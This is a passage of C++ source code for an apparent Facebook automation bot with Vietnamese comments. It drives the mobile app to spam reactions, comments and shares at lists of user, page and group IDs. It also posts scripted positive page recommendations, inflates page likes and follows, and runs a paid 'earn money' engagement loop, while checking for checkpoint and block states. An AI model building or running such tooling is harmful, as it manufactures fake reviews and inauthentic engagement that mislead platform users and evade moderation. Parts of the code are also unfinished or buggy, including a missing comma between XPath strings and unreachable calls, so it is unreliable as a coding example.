        updateLine("Spam Uid " + to_string(countSuccess + 1) + "/" + to_string(soLuongUid));
        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            if (isStopped()) break;
            if (txtUid.empty()) break;
            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;
            bool isValid = false;
            string uid = Common::ranItem(txtUid);
            switch (typeID) {
                case 0: // Chỉ chấp nhận profile
                    isValid = (uid.rfind("1000", 0) == 0 || uid.rfind("615", 0) == 0);
                    break;
                case 2: // Chấp nhận page
                    isValid = uid.rfind("1000", 0) == 0; // Kiểm tra nếu UID bắt đầu bằng "1000"
                    break;
                case 1:
                    isValid = uid.rfind("1000", 0) != 0; // Kiểm tra nếu UID bắt đầu bằng "1000"
                    uid = "/groups/" + uid;
                    break;
                default:
                    updateLine("Invalid ID: " + to_string(typeID));
                    return NOMAP;
            }

            if (!isValid) {
                Common::removeItem(txtUid, uid);
                continue;
            }
            Common::removeItem(txtUid, uid);
            if (handleSpamUid(uid)) {
                delay(1, 2,
                      "Spam Id " + to_string(countSuccess + 1) + "/" + to_string(soLuongUid) +
                      " success, delay");
                countSuccess++;
                if (countSuccess >= soLuongUid)
                    return DONE;
                updateLine("Spam Id " + to_string(countSuccess + 1) + "/" + to_string(soLuongUid));
                timeStart = high_resolution_clock::now();
                continue;
            }
        }
        return NOMAP;
    }

    //Handle spam uid
    bool handleSpamUid(string uid) {
        //input người dùng nhập
        int nudSoLuongBaiVietFrom = action.getInt("nudSoLuongBaiVietFrom");
        int nudSoLuongBaiVietTo = action.getInt("nudSoLuongBaiVietTo");
        int nudDelayFrom = action.getInt("nudDelayFrom");
        int nudDelayTo = action.getInt("nudDelayTo");

        bool ckbInteract = action.getBool("ckbInteract");
        int nudPercentInteract = action.getInt("nudPercentInteract");
        bool percentLike = Common::ranBool(nudPercentInteract);

        bool ckbShareWall = action.getBool("ckbShareWall");
        int nudPercentShareWall = action.getInt("nudPercentShareWall");

        bool ckbComment = action.getBool("ckbComment");
        int nudPercentComment = action.getInt("nudPercentComment");
        string commentContentId = action.getString("commentContentId");

        //input thêm biến nếu cần thiết
        int soLuongBaiViet = Common::ranNumber(nudSoLuongBaiVietFrom, nudSoLuongBaiVietTo);
        bool percentShare = Common::ranBool(nudPercentShareWall);
        bool percentCmt = Common::ranBool(nudPercentComment);
        int countBaiViet = 0;

        if (!gotoLink("https://www.facebook.com/" + uid))
            return false;
        delay(2);

        updateLine("Interact post " + to_string(countBaiViet) + "/" + to_string(soLuongBaiViet));
        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;
        //loop
        while (true) {

            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//*[@text='Like' or @content-desc='Like button. Double tap and hold to react.']",//trạng thái nút like trắng
                    "//*[@text='Comment' or @content-desc='Comment']",
                    "//*[@text='Share' or @content-desc='Share']",
                    "//*[@content-desc=\"This Page isn't available right now\" or @text=\"This Page isn't available right now\"]",//uid hỏng
            });
            if (element ==
                "//*[@content-desc=\"This Page isn't available right now\" or @text=\"This Page isn't available right now\"]")
                return false;

            if (element ==
                "//*[@text='Like' or @content-desc='Like button. Double tap and hold to react.']" ||
                element == "//*[@text='Comment' or @content-desc='Comment']" ||
                element == "//*[@text='Share' or @content-desc='Share']") {
                // nếu có các element này thì thực hiện các chức năng và để nếu không có thì lướt
//                if (ckbInteract && percentLike) {
//                    updateLine("React...");
//                    handleSpamReactionUid();
//                    delay(2);
//                }
//
//                //vì nút cmt và share không thay đổi dù có dùng thế nào, nên không dùng element để xđ mà làm tuần tự
//                //(mỗi khi xong 1 bài post thì luướt 2 lần để tránh lặp lại bài post đó)
//                if (ckbComment && percentCmt) {
//                    updateLine("Comment...");
//                    handleSpamCommentUid(commentContentId, xml);
//                    delay(2);
//                }
//
//                if (ckbShareWall && percentShare) {
//                    updateLine("Share...");
//                    handleSpamShareUid();
//                    delay(2);
//                }
                TuongTacNhieuBaiViet("Spam Uid");
                countBaiViet++;
                delay(nudDelayFrom, nudDelayTo, "Delay next post...");
                timeStart = high_resolution_clock::now();
                if (countBaiViet >= soLuongBaiViet)//hoàn thành đủ sl post thì thành công
                    return true;
            }
            if (swipeAndScreenNotChange(1, 2, 0))// lướt đến cuối nếu hết thì sẽ sang trang khác
                return false;
        }
        return false;
    }

    //Handle reaction spam uid
    bool handleSpamReactionUid() {
        // Input từ người dùng
        string typeReaction = action.getString("typeReaction"); // Loại cảm xúc

        // Bắt đầu tính thời gian
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        // Vòng lặp chính
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout)) {  // Khi timeout
                break;
            }

            string xml = dumpXml();
            string screen = handleScreen(xml);

            // Kiểm tra các điều kiện dừng sớm
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock()) {
                break;
            }

            if (Common::strContains(screen, "_POPUP_"))
                continue;

            if (screen == "FB_SESSION_EXPIRED")
                break;

            if (!existNode("//*[contains(@content-desc,'Like')]", xml,
                           0)) {
                return false;
                delay(2);
            }
            // Gửi yêu cầu react bài viết
            JSON configs = JSON();
            configs.set("typeReaction", typeReaction);
            JSON response = ReactPost(configs);

            bool isReactSuccess = response.getBool("success");

            if (isReactSuccess) {
                return true;  // Kết thúc hàm ngay khi react thành công
            }
            // Nếu phản ứng thất bại và tài khoản bị block thì dừng
            if (!isReactSuccess && IsBlock()) {
                break;
            }
            delay(3);  // Thêm độ trễ để tránh spam hành động
        }
        return false;
    }

    //Handle comment with image
    bool handleSpamCommentImg(string image, string xml) {
        vector<MediaS3> lstMedia = getScriptMedia(image);

        if (lstMedia.empty())
            return false;

        updateLine("Add image");

        if (!existNode("//android.widget.Button[@content-desc='Show photos and videos']", xml, 3)) {
            return false;
            delay(2);
        }
        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//android.widget.Button[@content-desc='Show photos and videos']",
                    "//android.widget.Button[@text='Enable gallery access']",
                    "//android.widget.Button[contains(@text,'Allow')]",
                    "(//*[contains(@content-desc,'Photo')])[1]"

            });
            if (element == "//android.widget.Button[@content-desc='Show photos and videos']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//android.widget.Button[@text='Enable gallery access']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//android.widget.Button[contains(@text,'Allow')]") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element ==
                "(//*[contains(@content-desc,'Photo')])[1]") {
                tapCenter(element, xml);
                delay(2);
                performAction(Perform::BACK, 1, 2);

//                if (ckbXoaAnhDaDung) {
//                    deleteScriptMedia(lstMedia);
//                }

                return true;
            }
        }
        return false;
    }

    //Handle spam comment uid
    bool handleSpamCommentUid(string textComment, string xml) {
        if (!existNode("//*[@text='Comment' or @content-desc='Comment']",
                       xml))// nếu account khóa phần bình luận
            return false;
        delay(2);

        //input người dùng nhập
        bool ckbSendAnh = action.getBool("ckbSendAnh");
        int nudPercentSendAnh = action.getInt("nudPercentSendAnh");
        bool percentImageCmt = Common::ranBool(nudPercentSendAnh);
        string galleryId = action.getString("galleryId");
        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//android.widget.EditText[@text='Write a comment…']",
                    "//android.widget.EditText[contains(@text,'Comment as ')]",
                    "//android.widget.EditText[@text='Write a public comment…']",
                    "//*[@text='Comment' or @content-desc='Comment']",
                    "//android.widget.Button[@content-desc='Send']",
            });

            if (element == "//*[@text='Comment' or @content-desc='Comment']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//android.widget.EditText[@text='Write a comment…']" ||
                element == "//android.widget.EditText[contains(@text,'Comment as ')]" ||
                element == "//android.widget.EditText[@text='Write a public comment…']") {
                auto [success, content, itemId] = getScriptContent(textComment);

                if (!success) {
                    saveStatusAcc("Get Script Content", "Failed", 5, Task::FAIL);
                    return NOMAP; // chay tiep hoac dung lai
                }

                // comment, dang bai, .....
                inputText("//android.widget.EditText", content);
                // xoa content sau khi su dung

                if (!itemId.empty()) {
                    deleteScriptContent(itemId);
                }
                delay(1);
                if (ckbSendAnh && percentImageCmt) {
                    handleSpamCommentImg(galleryId, xml);
                    delay(2);
                }
                continue;
            }
            if (element == "//android.widget.Button[@content-desc='Send']") {
                tap(element, xml);
                delay(2);
                waitNodeHide("//*[@text='Posting…' or @content-desc='Posting…']", 60);
                performAction(Perform::BACK, 2, 2);
                return true;
            }
        }
        return false;
    }

    //Handle spam share uid
    bool handleSpamShareUid() {
        // Khởi tạo bộ đếm thời gian timeout
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;


        string xml = dumpXml();
        string screen = handleScreen(xml);

        // Kiểm tra điều kiện dừng sớm
        if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock()) {
            return false;
        }

        if (screen == "FB_SESSION_EXPIRED") {
            return false;
        }

        // Gửi yêu cầu chia sẻ bài viết
        JSON configs = JSON();
        JSON response = SharePost(configs);

        bool isShareSuccess = response.getBool("success");

        if (isShareSuccess) {
            return true;  // Kết thúc hàm ngay khi chia sẻ thành công
        } else {
            return false;  // Trả về false nếu chia sẻ không thành công
        }
    }

    ResultScreen actionSeedingEvent() {
        Base::updateLine("actionSeedingEvent");
        return NOMAP;
    }

    ResultScreen actionEarnMoney() {
        //input người dùng nhập
        string txtApiKey = action.getString("txtApiKey");
        int nudDelayFrom = action.getInt("nudDelayFrom");
        int nudDelayTo = action.getInt("nudDelayTo");
        int nudChoLayJobTo = action.getInt("nudChoLayJobTo");
        int nudLimitTo = action.getInt("nudLimitTo");
        int nudMaxJobFail = action.getInt("nudMaxJobFail");
        bool ckbStopWhenLogout = action.getBool("ckbStopWhenLogout");
        string lstType = action.getString("lstType");
        int nudMinPrice = action.getInt("nudMinPrice");

        //xử lý input, khai báo thêm biến cần thiết
        int countJobRun = 0;
        int countJobSuccess = 0;
        if (account.displayName.empty()) {
            //account.displayName = API::Facebook::getDisplayName(account.uid);//get name
            //if (account.displayName.empty()) {
            //    delay(3, "Không lấy được tên tài khoản!");
            //    return NOMAP;
            //}
        }

        lstType = Common::strReplace(lstType, "reaction", "like,love,care,haha,wow,sad,angry");
        lstType = Common::strReplace(lstType, "commentfb",
                                     "commentfb,comment_campaign,commentfb_livestream");
        lstType = Common::strReplace(lstType, "share", "share,share_content");

        if (Common::strContains(lstType, "job_all")) {
            lstType = Common::strReplace(lstType, "job_all", "");
            vector<string> jobTypes = Common::strSplit(lstType, ",", true);

            std::transform(jobTypes.begin(), jobTypes.end(), jobTypes.begin(), [](std::string &s) {
                return s + "_all";
            });

            lstType = Common::strTrim(lstType, ",") + "," + Common::strJoin(jobTypes, ",");
        }

        int typeName = 0;
        //if (Common.IsVNName(name))
        //    typeName = 1;
        //else if (Common.IsENName(name))
        //    typeName = 2;



        return NOMAP;
    }

    ResultScreen actionRatePage() {
        //input người dùng nhập
        string txtUid = action.getString("txtUid");
        bool ckbLikePage = action.getBool("ckbLikePage");
        string postContentId = action.getString("postContentId");

        //xử lý input, khai báo thêm biến cần thiết
        bool isTapYes = false;

        //goto
        if (!gotoPage(txtUid))
            return NOMAP;

        //like page
        if (ckbLikePage) {
            //Đã like trớc
            updateLine("Like page...");
            if (LikePageUid(""))
                delay(2, "Like page success, delay");
        }

        updateLine("Review page...");

        //rate page-timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //rate page-loops
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//*[@text='Learn more about how ratings and reviews are processed on the New Page Experience.' or @content-desc ='Learn more about how ratings and reviews are processed on the New Page Experience.']",//sẽ xuất hiện phần cách tính review page của fb//đảo lên trước vì phần này dính quá nhiều xpath khác
                    "//*[contains(@text,'Not yet rated')]",//vào phần review của page
                    "//*[contains(@text,'Do you recommend ')]/following-sibling::*[@content-desc='Yes']",
                    "//*[@content-desc[contains(., 'See') and contains(., 'About info')]]",
                    "//*[@content-desc[contains(., 'recommend') and contains(., 'Reviews')]]",
                    "//android.widget.EditText[contains(@text,'What were some of the highlights')",//phần edittext đánh giá
                    "//android.widget.TextView[@text='Your review']"
                    "//*[@text='Share' or @content-desc='Share'][@enabled='true']",
                    "//*[contains(@text,' must be at least 25 characters')]",
                    "//*[@text='Skip' or @content-desc='Skip']",
                    "//*[contains(@text,'Posting your recommendation on ')]",
                    "//*[contains(@text,'Thanks for recommending ')]",
                    "//android.widget.ProgressBar",
            });

            if (element == "//*[contains(@text,'Not yet rated')]"
                || element ==
                   "//*[contains(@text,'Do you recommend ')]/following-sibling::*[@content-desc='Yes']") {
                if (existNode("//*[@content-desc='Yes']", xml)) {
                    if (isTapYes)
                        break;

                    isTapYes = true;
                    tap("//*[@content-desc='Yes']", xml);
                    delay(2);
                    continue;
                }
                if (existNode("//*[@text='Reviews']", xml))
                    break;

                tap(element, xml);
                delay(2);
                continue;
            }

            if (element == "//*[@content-desc[contains(., 'See') and contains(., 'About info')]]" ||
                element ==
                "//*[@content-desc[contains(., 'recommend') and contains(., 'Reviews')]]") {
                tapCenter(element, xml);
                delay(2);
                continue;
            }

            if (element ==
                "//*[@text='Learn more about how ratings and reviews are processed on the New Page Experience.' or @content-desc ='Learn more about how ratings and reviews are processed on the New Page Experience.']") {
                performAction(Perform::BACK, 1, 2);
                delay(2);
                continue;
            }

            if (element ==
                "//android.widget.EditText[contains(@text,'What were some of the highlights')"
                || element == "//android.widget.TextView[@text='Your review']") {
                auto [success, content, itemId] = getScriptContent(postContentId);

                if (!success) {
                    saveStatusAcc("Get Script Content", "Failed", 5, Task::FAIL);
                    return NOMAP; // chay tiep hoac dung lai
                }

                // comment, dang bai, .....
                // Common::NLog("Content: " + content, "handleTest");

                inputText("//android.widget.EditText", content);
                // xoa content sau khi su dung

                if (!itemId.empty()) {
                    deleteScriptContent(itemId);
                }
                delay(1);
                tap("//*[@content-desc='Done' or @text ='Done']");
                delay(2);
                continue;
            }
            if (element == "//*[@text='Share' or @content-desc='Share'][@enabled='true']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//*[contains(@text,' must be at least 25 characters')]")
                break;

            if (element == "//*[@text='Skip' or @content-desc='Skip']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//*[contains(@text,'Posting your recommendation on ')]") {
                delay(2);
                continue;
            }
            if (element == "//*[contains(@text,'Thanks for recommending ')]")
                return DONE;
            if (element == "//android.widget.ProgressBar") {
                delay(2);
                continue;
            }
            if (swipeAndScreenNotChange())
                break;
        }
        return NOMAP;
    }

    ResultScreen actionBuffLikePage() {
        //input người dùng nhập
        int nudDelayFrom = action.getInt("nudDelayFrom");
        int nudDelayTo = action.getInt("nudDelayTo");
        vector<string> txtUid = action.getList("txtUid");

        //xử lý input, khai báo thêm biến cần thiết
        int countSuccess = 0;
        int soLuong = txtUid.size();

        //goto
        updateLine("Like page " + (to_string(countSuccess + 1) + "/" + to_string(soLuong)));
        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;

            if (txtUid.empty())
                break;
            string uid = txtUid.front();
            Common::removeItem(txtUid, uid);


            if (LikePageUid(uid)) {
                delay(nudDelayFrom, nudDelayTo,
                      "Like page " + (to_string(countSuccess + 1) + "/" + to_string(soLuong) +
                                      " success, delay"));
                countSuccess++;
                if (countSuccess >= soLuong)
                    return DONE;
                updateLine("Like page " + (to_string(countSuccess + 1) + "/" + to_string(soLuong)));
                continue;
            }
        }
        return NOMAP;
    }

    // Handle Like page by Uid
    bool LikePageUid(string uid) {
        //xử lý input, khai báo thêm biến cần thiết
        bool isTapLike = false;

        //goto
        if (!uid.empty()) {
            if (!gotoPage(uid))
                return false;
            delay(2);
        }

        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;


        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//android.widget.Button[@content-desc='Liked']",
                    "//android.widget.Button[@content-desc='Like']",
                    "//*[@content-desc=\"This Page isn't available right now\" or @text=\"This Page isn't available right now\"]",
            });

            if (!existNode("//android.widget.Button[@content-desc='Like']", xml))
                return isTapLike;

            if (element == "//android.widget.Button[@content-desc='Liked']")
                return isTapLike;

            if (element == "//android.widget.Button[@content-desc='Like']") {
                if (isTapLike)
                    return false;

                isTapLike = true;
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element ==
                "//*[@content-desc=\"This Page isn't available right now\" or @text=\"This Page isn't available right now\"]") {
                return false;
            }

        }
        return false;
    }

    ResultScreen actionBuffFollowUid() {
        //input người dùng nhập
        int nudDelayFrom = action.getInt("nudDelayFrom");
        int nudDelayTo = action.getInt("nudDelayTo");
        vector<string> txtUid = action.getList("txtUid");

        //xử lý input, khai báo thêm biến cần thiết
        int countSuccess = 0;
        int soLuong = txtUid.size();

        //goto

        updateLine("Following " + to_string(countSuccess + 1) + "/" + to_string(soLuong));
        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;

            if (txtUid.empty())
                break;
            string uid = txtUid.front();
            Common::removeItem(txtUid, uid);


            if (handleBuffFollowUid(uid)) {
                delay(nudDelayFrom, nudDelayTo,
                      "Following " + to_string(countSuccess + 1) + "/" + to_string(soLuong) +
                      " success, delay");
                countSuccess++;
                if (countSuccess >= soLuong)
                    return DONE;
                updateLine("Following " + to_string(countSuccess + 1) + "/" + to_string(soLuong));
                continue;
            }
        }
        return NOMAP;
    }

    //Handle Follow by Uid
    bool handleBuffFollowUid(string uid) {
        //xử lý input, khai báo thêm biến cần thiết
        bool isTapFollow = false;

        //goto
        if (!uid.empty()) {
            if (!gotoProfile(uid))
                return false;
            delay(2);
        }
        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//android.widget.Button[@content-desc='Follow']",
                    "//android.widget.Button[@content-desc='Add friend']",
                    "//android.widget.Button[@content-desc='Cancel request']",
                    "//android.widget.Button[@content-desc='Like']",
                    "//android.widget.Button[@content-desc='Liked']",
                    "//*[@content-desc=\"This Page isn't available right now\" or @text=\"This Page isn't available right now\"]",
                    "//android.widget.Button[@content-desc='Following']",
            });
            if (element == "//android.widget.Button[@content-desc='Add friend']"
                || element == "//android.widget.Button[@content-desc='Cancel request']"
                || element == "//android.widget.Button[@content-desc='Like']"
                || element == "//android.widget.Button[@content-desc='Liked']") {
                tap("//android.widget.Button[@content-desc='More' or @content-desc='See more']");
                delay(2);
                continue;
            }
            if (element == "//android.widget.Button[@content-desc='Follow']") {
                if (isTapFollow)
                    return false;
                isTapFollow = true;
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element ==
                "//*[@content-desc=\"This Page isn't available right now\" or @text=\"This Page isn't available right now\"]"
                || element == "//android.widget.Button[@content-desc='Following']"
                || element != "//android.widget.Button[@content-desc='Follow']")
                return isTapFollow;
        }
        return false;
    }

    ResultScreen actionReactPostUid() {
        //input người dùng nhập
        vector<string> txtId = action.getList("txtId");
        int nudSoLuongFrom = action.getInt("nudSoLuongFrom");
        int nudSoLuongTo = action.getInt("nudSoLuongTo");
        int nudTimeFrom = action.getInt("nudTimeFrom");
        int nudTimeTo = action.getInt("nudTimeTo");

        //input thêm biến nếu cần thiết
        int soLuong = Common::ranNumber(nudSoLuongFrom, nudSoLuongTo);
        int countSuccess = 0;


        updateLine("Interact Post " + to_string(countSuccess + 1) + "/" + to_string(soLuong));
        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //goto

        //loop
        while (true) {
            if (isStopped()) break;
            if (txtId.empty()) break;
            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;
            string uid = Common::ranItem(txtId);
            Common::removeItem(txtId, uid);

            if (handleReactPostUid(uid)) {
                delay(nudTimeFrom, nudTimeTo,
                      "Interact Post " + to_string(countSuccess + 1) + "/" + to_string(soLuong) +
                      " success, delay");
                countSuccess++;
                if (countSuccess >= soLuong)
                    return DONE;

                updateLine(
                        "Interact Post " + to_string(countSuccess + 1) + "/" + to_string(soLuong));
                timeStart = high_resolution_clock::now();
                continue;
            }

        }

        return NOMAP;
    }

    //Handle react post by uid
    bool handleReactPostUid(string idPost) {
        //input người dùng nhập
        bool ckbInteract = action.getBool("ckbInteract");
        int nudPercentInteract = action.getInt("nudPercentInteract");

        bool ckbComment = action.getBool("ckbComment");
        int nudPercentComment = action.getInt("nudPercentComment");
        string commentContentId = action.getString("commentContentId");

        bool ckbShareWall = action.getBool("ckbShareWall");
        int nudPercentShareWall = action.getInt("nudPercentShareWall");

        //input xử lý các biến nếu cần thiết
        bool percentLike = Common::ranBool(nudPercentInteract);
        bool percentCmt = Common::ranBool(nudPercentComment);
        bool percentShare = Common::ranBool(nudPercentShareWall);
        //goto
        if (gotoPost(idPost) != "true")
            return false;

        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//*[@text='Like' or @content-desc='Like button. Double tap and hold to react.']",
                    "//*[@text='Comment' or @content-desc='Comment']",
                    "//*[@text='Share' or @content-desc='Share']",
                    "//*[@content-desc=\"This Page isn't available right now\" or @text=\"This Page isn't available right now\"]",//uid hỏng
            });
            if (element ==
                "//*[@content-desc=\"This Page isn't available right now\" or @text=\"This Page isn't available right now\"]")
                return false;
            if (element ==
                "//*[@text='Like' or @content-desc='Like button. Double tap and hold to react.']" ||
                element == "//*[@text='Comment' or @content-desc='Comment']" ||
                element == "//*[@text='Share' or @content-desc='Share']") {
                if (ckbInteract && percentLike) {
                    updateLine("React...");
                    handleSpamReactionUid();
                    delay(2);
                }

                if (ckbShareWall && percentShare) {
                    updateLine("Share...");
                    handleSharePostContent();
                    delay(2);
                }

                //vì nút cmt và share không thay đổi dù có dùng thế nào, nên không dùng element để xđ mà làm tuần tự
                if (ckbComment && percentCmt) {
                    updateLine("Comment...");
                    handleCommentPostByUid(commentContentId, xml);
                    delay(2);
                }

                //TuongTacNhieuBaiViet("Interact Post");
                return true;
            }
            if (swipeAndScreenNotChange())//nếu post ghi nhiều chữ quá
                return false;
        }
        return false;
    }

    //Handle share post by uid
    bool handleSharePostContent() {
        //input người dùng nhập
        bool ckbShareWall = action.getBool("ckbShareWall");
        int nudPercentShareWall = action.getInt("nudPercentShareWall");
        string shareContentId = action.getString("shareContentId");
        // Khởi tạo bộ đếm thời gian timeout
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        string xml = dumpXml();
        string screen = handleScreen(xml);

        // Kiểm tra điều kiện dừng sớm
        if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
            return false;

        if (screen == "FB_SESSION_EXPIRED")
            return false;
        if (ckbShareWall && Common::ranBool(nudPercentShareWall)) {
            updateLine("Share...");
            // Gửi yêu cầu chia sẻ bài viết
            JSON configs = JSON();
            configs.set("contentText", shareContentId);
            JSON response = SharePost(configs);
            bool isShareSuccess = response.getBool("success");
            if (isShareSuccess) {
                return true;  // Kết thúc hàm ngay khi chia sẻ thành công
            } else {
                return false;  // Trả về false nếu chia sẻ không thành công
            }
        }
    }

    //Handle comment post by uid
    bool handleCommentPostByUid(string textComment, string xml) {
        if (!existNode("//android.widget.Button[@text='Comment' or @content-desc='Comment']",
                       xml))// nếu account khóa phần bình luận
            return false;
        delay(2);

        //input người dùng nhập
        bool ckbSendAnh = action.getBool("ckbSendAnh");
        int nudPercentSendAnh = action.getInt("nudPercentSendAnh");
        bool percentImageCmt = Common::ranBool(nudPercentSendAnh);
        string galleryId = action.getString("galleryId");
        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//android.widget.Button[@text='Comment' or @content-desc='Comment']",
                    "//android.widget.EditText[@text='Write a comment…']",
                    "//android.widget.EditText[contains(@text,'Comment as ')]",
                    "//android.widget.EditText[@text='Write a public comment…']",
                    "//android.widget.Button[@content-desc='Send']",
            });
            if (element == "//android.widget.Button[@text='Comment' or @content-desc='Comment']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//android.widget.EditText[@text='Write a comment…']" ||
                element == "//android.widget.EditText[contains(@text,'Comment as ')]" ||
                element == "//android.widget.EditText[@text='Write a public comment…']") {
                auto [success, content, itemId] = getScriptContent(textComment);

                if (!success) {
                    saveStatusAcc("Get Script Content", "Failed", 5, Task::FAIL);
                    return NOMAP; // chay tiep hoac dung lai
                }

                // comment, dang bai, .....
                inputText("//android.widget.EditText", content);
                // xoa content sau khi su dung

                if (!itemId.empty()) {
                    deleteScriptContent(itemId);
                }
                delay(1);
                if (ckbSendAnh && percentImageCmt) {
                    xml = dumpXml();
                    handleSpamCommentImg(galleryId, xml);
                    delay(2);
                }
                continue;
            }
            if (element == "//android.widget.Button[@content-desc='Send']") {
                tap(element, xml);
                delay(2);
                performAction(Perform::BACK, 1, 2);
                return true;
            }
        }
        return false;
    }

    ResultScreen actionReactPostKeyword() {
        Base::updateLine("actionReactPostKeyword");
        //input người dùng nhập
        vector<string> txtTuKhoa = action.getList("txtTuKhoa");
        //xử lý input, khai báo thêm biến cần thiết

        //goto
        string tuKhoa = Common::ranItem(txtTuKhoa);
        updateLine("Interact: " + tuKhoa + "...");
        if (!gotoSearch(tuKhoa, "Posts"))
            return ERROR;
        delay(2);
        //timestart

        //loop
        TuongTacNhieuBaiViet("React post by keyword");
        return NOMAP;
    }

    ResultScreen actionReactVideoLive() {
        //input người dùng nhập
        string txtLinkVideo = action.getString("txtLinkVideo");
        int nudTimeFrom = action.getInt("nudTimeFrom");
        int nudTimeTo = action.getInt("nudTimeTo");
        bool ckbInteract = action.getBool("ckbInteract");
        bool ckbComment = action.getBool("ckbComment");
        string commentContentId = action.getString("commentContentId");
        bool ckbBinhLuanNhieuLan = action.getBool("ckbBinhLuanNhieuLan");
        int nudBinhLuanNhieuLanFrom = action.getInt("nudBinhLuanNhieuLanFrom");
        int nudBinhLuanNhieuLanTo = action.getInt("nudBinhLuanNhieuLanTo");
        bool ckbShareWall = action.getBool("ckbShareWall");

        //xử lý input , khai báo thêm biến cần thiết
        bool isCommented = false;
        int thoiGianTuongTac = Common::ranNumber(nudTimeFrom, nudTimeTo);
        //goto
        if (!gotoLive(txtLinkVideo))
            return ERROR;
        delay(2);

        //timestart
        auto timeStart = high_resolution_clock::now();
        //loop
        while (true) {
            if (Common::hasExceededTimeout(timeStart, thoiGianTuongTac))
                return DONE;
            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            //Interact video live
            if (ckbInteract)
                handleInteractVideoLive();
